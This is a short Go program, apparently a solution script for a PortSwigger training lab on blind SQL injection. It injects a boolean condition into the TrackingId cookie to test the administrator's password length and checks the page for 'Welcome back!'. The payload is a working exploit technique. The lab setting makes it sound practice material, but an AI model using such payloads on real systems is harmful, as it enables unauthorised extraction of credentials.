package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"

	_ "github.com/joho/godotenv/autoload"
)

func main() {
	myUrl := os.Getenv("PORTSWIGGER_LAB_URL")
	mySessionId := os.Getenv("SESSION_ID")
	myTrackingId := os.Getenv("TRACKING_ID")

	fmt.Println("Haxxing...")
	fmt.Println("url::: " + myUrl)
	fmt.Println("sessionId::: " + mySessionId)
	fmt.Println("trackingId::: " + myTrackingId)
	fmt.Println("-------------------")

	payload := "' AND (SELECT 'z' FROM users WHERE username = 'administrator' AND LENGTH(password) > 1 LIMIT 1)='z"

	var client http.Client
	req, err := http.NewRequest("GET", myUrl, nil)
	if err != nil {
		log.Fatalln(err)
	}
	cookiez := "TrackingId=" + myTrackingId + payload + ";session=" + mySessionId
	req.Header.Set("Cookie", cookiez)

	respz, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer respz.Body.Close()
	body, err := ioutil.ReadAll(respz.Body)
	if err != nil {
		log.Fatalln(err)
	}

	sb := string(body)
	//fmt.Println(sb)

	hasWelcomeBack := strings.Contains(sb, "Welcome back!")

	fmt.Println("hasWelcomeBack:::", hasWelcomeBack)

}
